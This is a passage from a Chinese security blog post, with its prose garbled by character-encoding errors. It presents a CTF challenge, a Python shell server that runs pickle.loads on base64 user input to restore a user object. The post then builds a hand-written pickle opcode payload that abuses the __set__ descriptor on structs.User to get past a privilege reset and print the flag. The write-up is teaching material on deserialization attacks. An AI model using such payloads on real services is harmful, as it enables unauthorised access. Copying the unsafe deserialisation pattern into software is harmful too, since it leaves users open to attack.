language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;whoami&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_whoami,<br>            <span class="hljs-string">&#x27;su&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_su,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read()<br>        flag = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.key, flag))<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Login as &#x27;</span> + user.name + <span class="hljs-string">&#x27; - &#x27;</span> + user.group)<br>        user.privileged = <span class="hljs-literal">False</span><br>        user.flag = flag<br>        <span class="hljs-variable language_">self</span>.user = user<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_whoami</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.user.name, <span class="hljs-variable language_">self</span>.user.group)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.user.privileged:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag: Permission denied&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.user.flag, <span class="hljs-variable language_">self</span>.key)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br><br><br><span class="hljs-comment">#  ----- structs.py ----- </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>ËøôÈÅìÈ¢ò‰πüÊØîËæÉÈöæ„ÄÇÈôêÂà∂Â¶Ç‰∏ãÔºö</p>
<ol type="1">
<li>Âè™ËÉΩÂºïÂÖ• structs Ê®°Âùó</li>
<li>ÊñπÊ≥ï‰∏≠‰∏çËÉΩÊúâ <code>.</code></li>
<li>Êó†Ê≥ï import È¢ùÂ§ñÁöÑÊ®°Âùó„ÄÇÊâÄ‰ª•Ë¶ÅÊÉ≥ÊãøÂà∞ flagÔºå<code>self.user.privileged</code> ÈúÄË¶Å‰∏ç‰∏∫ False</li>
</ol>
<p>Áî±‰∫é <code>user.privileged = False</code> ÊòØÂú®ÂèçÂ∫èÂàóÂåñ‰πãÂêéËøêË°åÁöÑÔºåÊâÄ‰ª•Â∞±ÁÆóË¶ÜÁõñ‰∫Ü struct ÁöÑ privilegedÔºå‰πü‰ºöË¢´Âº∫Âà∂ÊîπÂõûÊù•„ÄÇ</p>
<p>Êàë‰ª¨Áü•ÈÅìÔºåPython ÁöÑÁÇπËøêÁÆóÁ¨¶ÔºåËÉåÂêéÂÆûÈôÖ‰∏äÊòØÂêÑÁßçÊèèËø∞Âô®Âú®Ëµ∑‰ΩúÁî®ÔºåËÄåÊèèËø∞Âô®ÂÖ∂ÂÆûÁî± <code>__getattribute__()</code> ÊñπÊ≥ïË∞ÉÁî®ÁöÑ„ÄÇÊâÄ‰ª•ËøôÈáåÁöÑÊÄùË∑ØÂ∞±ÊòØ‰øÆÊîπÊèèËø∞Âô®‰ΩøÂæó <code>.</code> ÁöÑË°å‰∏∫ÂèØÊéß„ÄÇÂØπ‰∫éÊèèËø∞Âô®Êàë‰ª¨Âπ∂‰∏çÈôåÁîüÔºåÂ¶ÇÊûú‰Ω†Ê≤°Áî®ËøáÔºåÂèØ‰ª•Áúã‰∏ãÂÆòÊñπÊñáÊ°£ÔºåËßÅËµÑÊñô 8„ÄÇ</p>
<p>Â¶ÇÊûú‰∏Ä‰∏™ÂØπË±°ÂÆö‰πâ‰∫Ü <code>__set__()</code> Êàñ <code>__delete__()</code>ÔºåÂàôÂÆÉ‰ºöË¢´ËßÜ‰∏∫Êï∞ÊçÆÊèèËø∞Âô®„ÄÇ ‰ªÖÂÆö‰πâ‰∫Ü <code>__get__()</code> ÁöÑÊèèËø∞Âô®Áß∞‰∏∫ÈùûÊï∞ÊçÆÊèèËø∞Âô®„ÄÇ</p>
<p>ÂÖ∂‰∏≠Ôºå<code>__set__()</code> ÂÜ≥ÂÆö‰∫ÜËµãÂÄºÊó∂ÁöÑË°å‰∏∫ÔºåÊâÄ‰ª•Êàë‰ª¨ËÉΩ‰∏çËÉΩÈÄöËøáÈáçËΩΩ <code>__set__</code> ‰ΩøÂæó <code>user.privileged = False</code> Â§±ÊïàÂë¢Ôºü</p>
<p>ÈÇ£‰πàËøô‰∏™Êó∂ÂÄôÂèØ‰ª•Á≠â‰ª∑‰∏∫Ôºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br><br><br>user = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br><span class="hljs-comment"># Âú®ËøôÈáåÈù¢ÂÜôÂÖ•ÂêàÈÄÇÁöÑËØ≠Âè•</span><br><br>user.privileged = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(user.privileged)  <span class="hljs-comment"># ‰ΩøÂæó user.privileged == True</span><br></code></pre></td></tr></table></figure></p>
<p>È¶ñÂÖàÔºå<code>__set__</code> Â∫îËØ•Ëµã‰∫à‰∏Ä‰∏™ callableÔºà<del>Â∫üËØù</del>ÔºâÔºåËøô‰∏™ callable ÊòØÊØîËæÉÊúâËÆ≤Á©∂ÁöÑÔºö</p>
<ol type="1">
<li>ÂøÖÈ°ªË¶ÅÊúâ‰∏â‰∏™ÂèÇÊï∞ÔºåÊâßË°å <code>user.privileged = False</code> ÁöÑÊó∂ÂÄôÔºåÂàÜ‰∏∫Áî®‰∫éÊé•Êî∂ <code>user</code>„ÄÅ<code>privileged</code>„ÄÅ<code>False</code></li>
<li>ËøîÂõûÂÄºÂøÖÈ°ª‰∏ç‰∏∫Âπø‰πâÁöÑ FalseÔºà‰ªÄ‰πà None Âïä„ÄÅ"" ÂïäÔºåÈÉΩÁÆóÂπø‰πâÁöÑ FalseÔºâ</li>
<li>Ë∞ÉÁî®ÁöÑÊ∫êÂ§¥ÂøÖÈ°ªÂú®‰∏Ä‰∏™Á±ª‰∏≠</li>
</ol>
<p>ÈÇ£‰πàÂú®ËøôÈÅìÈ¢òÁõÆ‰∏≠ÔºåUser Ëøô‰∏™Á±ªÊú¨Ë∫´Ê≠£Â•ΩÁ¨¶ÂêàË¶ÅÊ±ÇÔºåÊâÄ‰ª•ÂèØ‰ª•Ëøô‰πàÂÜôÔºö<code>User.__set__ = User</code>„ÄÇ‰ΩÜÊòØÂ¶ÇÊûúÂè™ÂÜôËøô‰∏ÄÂè•ÁöÑËØùÔºå‰Ω†‰ºöÂèëÁé∞ËøòÊòØÊó†Ê≥ïÊîπÂèò <code>user.privileged = False</code> ÁöÑË°å‰∏∫„ÄÇ</p>
<p>Ëøô‰∏™Êó∂ÂÄôÂ∞±ÈúÄË¶ÅÁúã‰∏ã <code>__set__</code> Âà∞Â∫ïÂ¶Ç‰ΩïÊîπÂèò Python ËµãÂÄºË°å‰∏∫ÁöÑ„ÄÇÂØπ‰∫é <code>obj.attr = value</code>ÔºàÂú®ÂØπÂ±ûÊÄßËµãÂÄºÊó∂ÔºâÔºåPython ÁöÑÊü•ÊâæÁ≠ñÁï•ÊòØËøôÊ†∑ÁöÑÔºöÊü•Êâæ <code>obj.__class__.__dict__</code>ÔºåÂ¶ÇÊûú attr Â≠òÂú®Âπ∂‰∏îÊòØ‰∏Ä‰∏™Êï∞ÊçÆÊèèËø∞Âô®ÔºåË∞ÉÁî® attr ÁöÑ <code>__set__</code> ÊñπÊ≥ïÔºåÁªìÊùü„ÄÇÂ¶ÇÊûú‰∏çÂ≠òÂú®Ôºå‰ºöÁªßÁª≠Âà∞ <code>obj.__class__</code> ÁöÑÁà∂Á±ªÂíåÁ•ñÂÖàÁ±ª‰∏≠Êü•ÊâæÔºåÊâæÂà∞Êï∞ÊçÆÊèèËø∞Âô®ÂàôË∞ÉÁî®ÂÖ∂ <code>__set__</code> ÊñπÊ≥ïÔºåÊ≤°ÊâæÂà∞ÂàôÊâßË°å <code>obj.__dict__['attr'] = value</code>„ÄÇ</p>
<p>ÊâÄ‰ª•Êàë‰ª¨Â∫îËØ•ËøòË¶ÅÂä†‰∏ÄÂè• <code>User.privileged = User("tr0y", "root")</code> ‰øùËØÅ <code>user.__class__.__dict__</code> Â∑≤ÁªèÊúâ‰∫Ü <code>privileged</code> Âπ∂‰∏îÊòØ‰∏Ä‰∏™Êï∞ÊçÆÊèèËø∞Âô®ÔºåËøôÊ†∑Â∞±‰ºöËµ∞Âà∞ <code>__set__</code>„ÄÇÊ©òÂèã‰ª¨ÂèØËÉΩ‰ºöÈóÆÔºåÈÇ£‰∏∫‰ªÄ‰πà‰∏çËÉΩ <code>user.privileged = User("tr0y", "root")</code> Ëøô‰πàÂÜôÂë¢ÔºüÂéüÂõ†Âú®‰∫éÔºåprivileged Ëøô‰∏™Â±ûÊÄßÊòØ‰∏çÂ≠òÂú®‰∫é <code>user</code> ÁöÑÔºåÊâÄ‰ª•‰ºöÁªßÁª≠Âú®Áà∂Á±ª‰∏≠ÊâæÔºåËÄåÁà∂Á±ª‰πüÊ≤°ÊúâËøô‰∏™Â±ûÊÄßÔºåÊâÄ‰ª•Áõ¥Êé•ÊâßË°åÁöÑÊòØ <code>user.__dict__['privileged'] = User("tr0y", "root")</code>ÔºåËøôÊ†∑ÊòØËµ∑‰∏çÂà∞‰ΩúÁî®ÁöÑ„ÄÇÂêåÊó∂Áî±‰∫é flag Âπ∂‰∏çÂ≠òÂú®‰∫é <code>user.__class__.__dict__</code> ÈáåÔºå‰∏îÁà∂Á±ªÁöÑ User ‰πüÊ≤°Êúâ flag Ëøô‰∏™Â±ûÊÄßÔºåÊâÄ‰ª• flag Ëøô‰∏™Â±ûÊÄßÊòØÊ≠£Â∏∏ËµãÂÄºÁöÑ„ÄÇ</p>
<p>ËøôÊ†∑ÁöÑËØùÔºåÊàë‰ª¨Ë¶ÅÂä†ÁöÑËØ≠Âè•Â∫îËØ•ÊòØÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">User.__set__ = User<br>User.privileged = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>ÊúÄÂêéÁöÑÊúÄÂêéÔºåÁî±‰∫é <code>structs.User.__dict__</code> ÊòØ mappingproxy Á±ªÂûãÔºåÊâÄ‰ª•ÈúÄË¶ÅÁî®Âà∞ÂèòÈáèË¶ÜÁõñÈáåÊèêÂà∞ÁöÑÈÇ£‰∏™ tip</p>
<p>Áªº‰∏äÔºåËΩ¨‰∏∫ opcode Â∞±ÊòØÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># Êñ∞Â¢û __set__<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb<br>0  # ÂºπÂá∫<br># Êñ∞Â¢û privileged<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb<br>0  # ÂºπÂá∫<br># ËøîÂõû structs.User ÂÆû‰æã<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br><br># ÊúÄÁªà payload<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
<h2 id="ÊÄªÁªì">ÊÄªÁªì</h2>
<p>Ê©òÂèã‰ª¨Â∫îËØ•ÂèØ‰ª•ÂèëÁé∞Ôºåopcode Êúâ‰∏™ÁâπÁÇπÊòØ‚ÄúËµãÂÄºÂÆπÊòìÊü•ÂÄºÈöæ‚Äù„ÄÇÂ¶Ç‰ΩïÂà©Áî® opcode ÊûÑÈÄ† payload ÈúÄË¶ÅÂ§öÁªÉ‰π†ÊâçËÉΩÊéåÊè°Ôºå‰ª•ÂèäÂØπ Python È≠îÊúØÊñπÊ≥ïÁ≠âÂêÑÁßçÁ®çÂ∫ïÂ±ÇÁöÑÂéüÁêÜË¶ÅÊúâ‰∏ÄÂÆöÁöÑÁêÜËß£ÔºåÊâçËÉΩÂ§üÁü•ÂÖ∂ÁÑ∂‰πüÁü•ÂÖ∂ÊâÄ‰ª•ÁÑ∂„ÄÇ</p>
<p>Python ÂèçÂ∫èÂàóÂåñ„ÄÅPython Ê≤ôÁÆ±ÈÄÉÈÄ∏Ôºå‰ª•Âèä SSIT ÊâÄÈúÄÁöÑÁü•ËØÜÁÇπÊúâÁùÄÂæàÂ§ßÁöÑÂÖ≥ËÅîÊÄßÔºåÈÄöÂÖ∂‰∏ÄËÄåÁü•ÂÖ∂ÁôæÔºå‰øùÊåÅÁü•ËØÜÁöÑËøûÈÄöÊÄßÊïàÁéáÊâç‰ºöÈ´ò„ÄÇ</p>
<h2 id="ËµÑÊñô">ËµÑÊñô</h2>
<ol type="1">
<li>Python Ê≤ôÁÆ±ÈÄÉÈÄ∏ÁöÑÁªèÈ™åÊÄªÁªì<br />
https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</li>
<li>pickle.py ‰∏≠ opcode Â§áÊ≥®<br />
https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L107</li>
<li>ÂèØ‰ª•Â∫èÂàóÂåñÁöÑ‰∏úË•ø<br />
https://docs.python.org/zh-cn/3/library/pickle.html#what-can-be-pickled-and-unpickled</li>
<li>pkerÔºåÊñπ‰æøÁîüÊàê opcode ÁöÑÂ∑•ÂÖ∑<br />
https://github.com/EddieIvan01/pker</li>
<li>Python ÁöÑÂØºÂÖ•Êú∫Âà∂<br />
https://docs.python.org/zh-cn/3/reference/import.html#the-import-system</li>
<li>pickle ÁöÑ load_build ÈÄªËæë<br />
https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L1697</li>
<li>BalsnCTF-2019 Python ÂèçÂ∫èÂàóÂåñÈ¢ò<br />
https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc</li>
<li>Python ÊèèËø∞Âô®<br />
https://docs.python.org/zh-cn/3/howto/descriptor.html</li>
</ol>
<br>
<p style="text-align: center;">
<font size="2px" color="gray">‰ªäÂπ¥Â∫îËØ•ÊòØÊúÄÊÉ®ÁöÑ‰∏Ä‰∏™Êò•ËäÇ<br>Âú®Â§ñÂú∞Â±ÖÂÆ∂ÈöîÁ¶ª<br>‰Ω†ËØ¥ÂõûÂÆ∂ÂêßÂ•ΩÂÉèÁ°ÆÂÆû‰πüÊå∫Êó†ËÅäÁöÑ<br>‰ΩÜÂ∞±ÊòØÊéßÂà∂‰∏ç‰ΩèÊÉ≥ÂõûÂéª<br>‰∏Ä‰∏™‰∫∫ËøáÊò•ËäÇ<br>Â§©Â§©ÂêÉÊîøÂ∫úÂèëÁöÑÁõíÈ•≠<br>ÁúüÊòØÂ§™ÂÆπÊòìÁÑ¶Ëôë‰∫Ü<br>Â∏åÊúõÁñ´ÊÉÖÊó©ÁÇπÁªìÊùü<br><br>ËøôÁØáÊñáÁ´†ÊòØ‰ªéÈô§Â§ïÂºÄÂßãÂÜôÁöÑ<br>ÂåñÁÑ¶Ëôë‰∏∫Âä®Âäõ‰∫ÜÂ±ûÂÆûÊòØ<br><br>Ëøô‰∏§Â§©Êêû‰∫Ü‰∏™ÂæÆÂçöË¥¶Âè∑<br>ÂæÆÂçö id ÊòØ 6575448477ÔºåÁî®Êà∑ÂêçÊòØ Macr0phag3<br>‰∏ªË¶ÅÊòØÊï¥Ê¥ªÂíåÂèë‰∏Ä‰∫õÊäÄÊúØÂïä„ÄÅÊëÑÂΩ±Âïä‰πãÁ±ªÁöÑÊó•Â∏∏<br>ÈöîÁ¶ªÊúüÈó¥ÁúüÁöÑËØùÂ§öÔºåÊúâÁÇπÂï∞Âó¶ÂìàÂìàÂìà<br>Â•Ω‰∫ÜÂ∞±ËØ¥Âà∞ËøôÂêß<br><br>Á•ùÊ©òÂèã‰ª¨ËôéÂπ¥ËôéËôéÁîüÂ®ÅÔºåÂ§ßÂêâÂ§ßÂà©</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">ÁªèÈ™åÊÄªÁªì</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/SecMap/">#SecMap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SecMap - ÂèçÂ∫èÂàóÂåñÔºàPythonÔºâ</div>
      <div>https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2022Âπ¥2Êúà3Êó•</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Êõ¥Êñ∞‰∫é</div>
          <div>2025Âπ¥4Êúà15Êó•</div>
        </div>
      
      <div class="license-meta-item">
        <div>ËÆ∏ÂèØÂçèËÆÆ</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/13/SecMap-SSTI-jinja2/" title="SecMap - SSTIÔºàjinja2Ôºâ">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SecMap - SSTIÔºàjinja2Ôºâ</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/11/domain-takeover-by-cfp/" title="Âà©Áî® Cloudflare Partner Âä´ÊåÅÂüüÂêç">
                        <span class="hidden-mobile">Âà©Áî® Cloudflare Partner Âä´ÊåÅÂüüÂêç</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ÁõÆÂΩï</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="leancloud-site-pv"></span>
         Ê¨°
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="leancloud-site-uv"></span>
         ‰∫∫
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


